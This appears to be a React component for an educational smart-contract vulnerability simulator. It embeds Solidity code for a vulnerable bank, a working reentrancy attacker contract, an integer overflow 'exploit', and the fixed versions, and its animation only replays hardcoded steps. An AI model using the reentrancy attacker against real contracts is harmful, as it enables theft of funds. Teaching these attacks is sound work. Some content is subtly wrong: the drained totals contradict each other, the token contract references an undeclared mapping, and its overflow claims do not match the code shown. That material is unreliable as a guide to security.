import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import { ArrowLeft, Play, Pause, RotateCcw, AlertTriangle, Code, Zap, Shield, Eye, Download } from 'lucide-react';

interface SimulationStep {
  id: number;
  title: string;
  description: string;
  code: string;
  type: 'normal' | 'vulnerable' | 'exploit' | 'fix';
  gasUsed?: number;
  status: 'pending' | 'executing' | 'completed' | 'failed';
}

interface SimulationScenario {
  id: string;
  name: string;
  description: string;
  vulnerability: string;
  severity: 'high' | 'medium' | 'low';
  steps: SimulationStep[];
}

const VulnerabilitySimulator: React.FC = () => {
  const [selectedScenario, setSelectedScenario] = useState<SimulationScenario | null>(null);
  const [isSimulating, setIsSimulating] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [simulationResults, setSimulationResults] = useState<any>(null);

  const scenarios: SimulationScenario[] = [
    {
      id: 'reentrancy',
      name: 'Reentrancy Attack',
      description: 'Demonstrates how an attacker can exploit reentrancy vulnerability to drain contract funds',
      vulnerability: 'Reentrancy',
      severity: 'high',
      steps: [
        {
          id: 1,
          title: 'Initial Contract State',
          description: 'Contract has 100 ETH in balance, user has 10 ETH deposited',
          code: `contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        
        // VULNERABLE: External call before state update
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] = 0; // State update AFTER external call
    }
}`,
          type: 'vulnerable',
          gasUsed: 21000,
          status: 'pending'
        },
        {
          id: 2,
          title: 'Attacker Contract Deployment',
          description: 'Malicious contract with fallback function to exploit reentrancy',
          code: `contract ReentrancyAttacker {
    VulnerableBank public bank;
    uint256 public attackAmount = 1 ether;
    
    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }
    
    function attack() external payable {
        require(msg.value >= attackAmount, "Need at least 1 ETH");
        bank.deposit{value: attackAmount}();
        bank.withdraw();
    }
    
    // Malicious fallback function
    receive() external payable {
        if (address(bank).balance >= attackAmount) {
            bank.withdraw(); // Recursive call!
        }
    }
}`,
          type: 'exploit',
          gasUsed: 45000,
          status: 'pending'
        },
        {
          id: 3,
          title: 'Attack Execution',
          description: 'Attacker calls attack() function, triggering recursive withdrawals',
          code: `// Attack sequence:
// 1. Attacker deposits 1 ETH
// 2. Attacker calls withdraw()
// 3. Contract sends 1 ETH to attacker
// 4. Attacker's receive() function is triggered
// 5. Attacker calls withdraw() again (balance still 1 ETH!)
// 6. Process repeats until contract is drained

Transaction Flow:
withdraw() -> send ETH -> receive() -> withdraw() -> send ETH -> ...`,
          type: 'exploit',
          gasUsed: 180000,
          status: 'pending'
        },
        {
          id: 4,
          title: 'Attack Result',
          description: 'Contract drained! Attacker stole 10 ETH with only 1 ETH investment',
          code: `// Final State:
// Contract Balance: 0 ETH (was 100 ETH)
// Attacker Profit: 10 ETH
// Attack Cost: 1 ETH + gas fees
// Net Profit: 9 ETH

// The attacker exploited the fact that balances[msg.sender] 
// was not set to 0 before the external call, allowing 
// multiple withdrawals of the same balance.`,
          type: 'exploit',
          gasUsed: 250000,
          status: 'pending'
        },
        {
          id: 5,
          title: 'Secure Implementation',
          description: 'Fixed version using checks-effects-interactions pattern',
          code: `contract SecureBank {
    mapping(address => uint256) public balances;
    bool private locked;
    
    modifier nonReentrant() {
        require(!locked, "Reentrant call");
        locked = true;
        _;
        locked = false;
    }
    
    function withdraw() public nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        
        // SECURE: State update BEFORE external call
        balances[msg.sender] = 0;
        
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}`,
          type: 'fix',
          gasUsed: 28000,
          status: 'pending'
        }
      ]
    },
    {
      id: 'overflow',
      name: 'Integer Overflow Attack',
      description: 'Shows how arithmetic operations can overflow and cause unexpected behavior',
      vulnerability: 'Integer Overflow',
      severity: 'medium',
      steps: [
        {
          id: 1,
          title: 'Vulnerable Token Contract',
          description: 'Token contract without SafeMath protection',
          code: `contract VulnerableToken {
    mapping(address => uint256) public balances;
    uint256 public totalSupply = 1000000;
    
    function transfer(address to, uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // VULNERABLE: No overflow protection
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
    
    function approve(address spender, uint256 amount) public {
        // VULNERABLE: Can overflow to create unlimited allowance
        allowances[msg.sender][spender] = amount;
    }
}`,
          type: 'vulnerable',
          gasUsed: 35000,
          status: 'pending'
        },
        {
          id: 2,
          title: 'Overflow Exploit',
          description: 'Attacker exploits integer overflow in approval function',
          code: `// Attacker calls approve with maximum uint256 value
uint256 maxValue = 2**256 - 1;
token.approve(attackerAddress, maxValue);

// When the approved amount is used, it can overflow
// causing unexpected behavior in balance calculations

// Example: If balance is 100 and we subtract 200:
// 100 - 200 = underflow = 2^256 - 100 (huge number!)`,
          type: 'exploit',
          gasUsed: 42000,
          status: 'pending'
        },
        {
          id: 3,
          title: 'Secure Implementation',
          description: 'Fixed version using SafeMath or Solidity 0.8+',
          code: `// Option 1: Using SafeMath (Solidity < 0.8)
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract SecureToken {
    using SafeMath for uint256;
    
    function transfer(address to, uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] = balances[msg.sender].sub(amount);
        balances[to] = balances[to].add(amount);
    }
}

// Option 2: Solidity 0.8+ (built-in overflow protection)
pragma solidity ^0.8.0;

contract SecureToken {
    function transfer(address to, uint256 amount) public {
        // Automatic overflow/underflow protection
        balances[msg.sender] -= amount; // Will revert on underflow
        balances[to] += amount; // Will revert on overflow
    }
}`,
          type: 'fix',
          gasUsed: 38000,
          status: 'pending'
        }
      ]
    }
  ];

  const runSimulation = async () => {
    if (!selectedScenario) return;
    
    setIsSimulating(true);
    setCurrentStep(0);
    
    // Reset all steps
    const updatedSteps = selectedScenario.steps.map(step => ({
      ...step,
      status: 'pending' as const
    }));
    
    setSelectedScenario({
      ...selectedScenario,
      steps: updatedSteps
    });

    // Simulate each step
    for (let i = 0; i < selectedScenario.steps.length; i++) {
      setCurrentStep(i);
      
      // Update current step to executing
      setSelectedScenario(prev => prev ? {
        ...prev,
        steps: prev.steps.map((step, index) => 
          index === i ? { ...step, status: 'executing' } : step
        )
      } : null);
      
      // Simulate execution time
      await new Promise(resolve => setTimeout(resolve, 2000 + Math.random() * 1000));
      
      // Mark as completed
      setSelectedScenario(prev => prev ? {
        ...prev,
        steps: prev.steps.map((step, index) => 
          index === i ? { ...step, status: 'completed' } : step
        )
      } : null);
    }
    
    setIsSimulating(false);
    
    // Generate simulation results
    setSimulationResults({
      totalGasUsed: selectedScenario.steps.reduce((total, step) => total + (step.gasUsed || 0), 0),
      executionTime: selectedScenario.steps.length * 2.5,
      vulnerabilityExploited: true,
      fundsAtRisk: selectedScenario.id === 'reentrancy' ? '10 ETH' : 'Unlimited tokens',
      recommendation: 'Implement security fixes immediately'
    });
  };

  const resetSimulation = () => {
    setIsSimulating(false);
    setCurrentStep(0);
    setSimulationResults(null);
    
    if (selectedScenario) {
      setSelectedScenario({
        ...selectedScenario,
        steps: selectedScenario.steps.map(step => ({
          ...step,
          status: 'pending'
        }))
      });
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Navigation */}
      <nav className="bg-white shadow-sm">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <Link to="/" className="flex items-center text-gray-600 hover:text-gray-900">
              <ArrowLeft className="w-5 h-5 mr-2" />
              Back to Home
            </Link>
            <div className="flex items-center space-x-2">
              <Zap className="w-5 h-5 text-primary-500" />
              <h1 className="text-xl font-bold">Vulnerability Simulator</h1>
            </div>
          </div>
        </div>
      </nav>

      <main className="container mx-auto px-4 py-8">
        {/* Header Section */}
        <div className="bg-white rounded-xl shadow-sm p-8 mb-8" data-aos="fade-up">
          <div className="text-center mb-8">
            <div className="inline-flex items-center justify-center w-16 h-16 bg-primary-100 rounded-full mb-4">
              <Zap className="w-8 h-8 text-primary-600" />
            </div>
            <h2 className="text-3xl font-bold mb-4">Interactive Vulnerability Simulator</h2>
            <p className="text-lg text-gray-600 max-w-2xl mx-auto">
              Visualize how smart contract vulnerabilities work through step-by-step animated simulations. 
              Learn attack vectors and security best practices.
            </p>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* Scenario Selection */}
          <div className="lg:col-span-1">
            <div className="bg-white rounded-xl shadow-sm p-6 sticky top-8" data-aos="fade-right">
              <h3 className="text-xl font-bold mb-6">Attack Scenarios</h3>
              
              <div className="space-y-4">
                {scenarios.map((scenario) => (
                  <div
                    key={scenario.id}
                    onClick={() => setSelectedScenario(scenario)}
                    className={`p-4 rounded-lg border-2 cursor-pointer transition-all duration-300 ${
                      selectedScenario?.id === scenario.id
                        ? 'border-primary-500 bg-primary-50'
                        : 'border-gray-200 hover:border-gray-300'
                    }`}
                  >
                    <div className="flex items-start justify-between mb-2">
                      <h4 className="font-semibold">{scenario.name}</h4>
                      <span className={`px-2 py-1 rounded text-xs font-medium ${
                        scenario.severity === 'high' ? 'bg-red-100 text-red-800' :
                        scenario.severity === 'medium' ? 'bg-orange-100 text-orange-800' :
                        'bg-yellow-100 text-yellow-800'
                      }`}>
                        {scenario.severity.toUpperCase()}
                      </span>
                    </div>
                    <p className="text-sm text-gray-600 mb-3">{scenario.description}</p>
                    <div className="flex items-center text-sm text-gray-500">
                      <AlertTriangle className="w-4 h-4 mr-1" />
                      <span>{scenario.vulnerability}</span>
                    </div>
                  </div>
                ))}
              </div>

              {selectedScenario && (
                <div className="mt-6 pt-6 border-t border-gray-200">
                  <div className="flex space-x-3">
                    <button
                      onClick={runSimulation}
                      disabled={isSimulating}
                      className="flex-1 btn-primary py-2 px-4 flex items-center justify-center"
                    >
                      {isSimulating ? (
                        <>
                          <Pause className="w-4 h-4 mr-2" />
                          Running...
                        </>
                      ) : (
                        <>
                          <Play className="w-4 h-4 mr-2" />
                          Run Simulation
                        </>
                      )}
                    </button>
                    
                    <button
                      onClick={resetSimulation}
                      className="btn-secondary py-2 px-4 flex items-center"
                    >
                      <RotateCcw className="w-4 h-4" />
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* Simulation Display */}
          <div className="lg:col-span-2">
            {selectedScenario ? (
              <div className="space-y-6" data-aos="fade-left">
                {/* Simulation Steps */}
                <div className="bg-white rounded-xl shadow-sm p-6">
                  <div className="flex items-center justify-between mb-6">
                    <h3 className="text-xl font-bold">Simulation Steps</h3>
                    {isSimulating && (
                      <div className="flex items-center text-sm text-blue-600">
                        <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600 mr-2"></div>
                        Step {currentStep + 1} of {selectedScenario.steps.length}
                      </div>
                    )}
                  </div>
                  
                  <div className="space-y-6">
                    {selectedScenario.steps.map((step, index) => (
                      <div
                        key={step.id}
                        className={`relative p-6 rounded-lg border-2 transition-all duration-500 ${
                          step.status === 'executing' ? 'border-blue-500 bg-blue-50 animate-pulse' :
                          step.status === 'completed' ? 'border-green-500 bg-green-50' :
                          step.status === 'failed' ? 'border-red-500 bg-red-50' :
                          'border-gray-200'
                        }`}
                      >
                        {/* Step indicator */}
                        <div className="absolute -left-3 top-6">
                          <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs font-bold ${
                            step.status === 'executing' ? 'bg-blue-500 text-white' :
                            step.status === 'completed' ? 'bg-green-500 text-white' :
                            step.status === 'failed' ? 'bg-red-500 text-white' :
                            'bg-gray-300 text-gray-600'
                          }`}>
                            {index + 1}
                          </div>
                        </div>
                        
                        <div className="ml-4">
                          <div className="flex items-center justify-between mb-3">
                            <h4 className="font-semibold text-lg">{step.title}</h4>
                            <div className="flex items-center space-x-2">
                              {step.gasUsed && (
                                <span className="text-xs bg-gray-100 px-2 py-1 rounded">
                                  Gas: {step.gasUsed.toLocaleString()}
                                </span>
                              )}
                              <span className={`px-2 py-1 rounded text-xs font-medium ${
                                step.type === 'vulnerable' ? 'bg-red-100 text-red-800' :
                                step.type === 'exploit' ? 'bg-orange-100 text-orange-800' :
                                step.type === 'fix' ? 'bg-green-100 text-green-800' :
                                'bg-blue-100 text-blue-800'
                              }`}>
                                {step.type.toUpperCase()}
                              </span>
                            </div>
                          </div>
                          
                          <p className="text-gray-600 mb-4">{step.description}</p>
                          
                          <div className="bg-gray-900 rounded-lg p-4 overflow-auto">
                            <pre className="text-sm text-green-400 whitespace-pre-wrap">
                              <code>{step.code}</code>
                            </pre>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Simulation Results */}
                {simulationResults && (
                  <div className="bg-white rounded-xl shadow-sm p-6">
                    <h3 className="text-xl font-bold mb-6">Simulation Results</h3>
                    
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      <div className="space-y-4">
                        <div className="flex justify-between">
                          <span className="text-gray-600">Total Gas Used:</span>
                          <span className="font-medium">{simulationResults.totalGasUsed.toLocaleString()}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-600">Execution Time:</span>
                          <span className="font-medium">{simulationResults.executionTime}s</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-600">Funds at Risk:</span>
                          <span className="font-medium text-red-600">{simulationResults.fundsAtRisk}</span>
                        </div>
                      </div>
                      
                      <div className="p-4 bg-red-50 rounded-lg border border-red-200">
                        <div className="flex items-start">
                          <AlertTriangle className="w-5 h-5 text-red-600 mr-2 mt-0.5" />
                          <div>
                            <h5 className="font-medium text-red-800 mb-1">Vulnerability Exploited!</h5>
                            <p className="text-sm text-red-700">{simulationResults.recommendation}</p>
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    <div className="mt-6 flex space-x-4">
                      <button className="btn-primary py-2 px-4 flex items-center">
                        <Download className="w-4 h-4 mr-2" />
                        Export Report
                      </button>
                      <button className="btn-secondary py-2 px-4 flex items-center">
                        <Eye className="w-4 h-4 mr-2" />
                        View Mitigation
                      </button>
                    </div>
                  </div>
                )}
              </div>
            ) : (
              <div className="bg-white rounded-xl shadow-sm p-12 text-center" data-aos="fade-left">
                <Code className="w-16 h-16 text-gray-400 mx-auto mb-4" />
                <h3 className="text-xl font-semibold text-gray-600 mb-2">Select a Scenario</h3>
                <p className="text-gray-500">Choose an attack scenario from the left panel to begin the simulation</p>
              </div>
            )}
          </div>
        </div>
      </main>
    </div>
  );
};

export default VulnerabilitySimulator;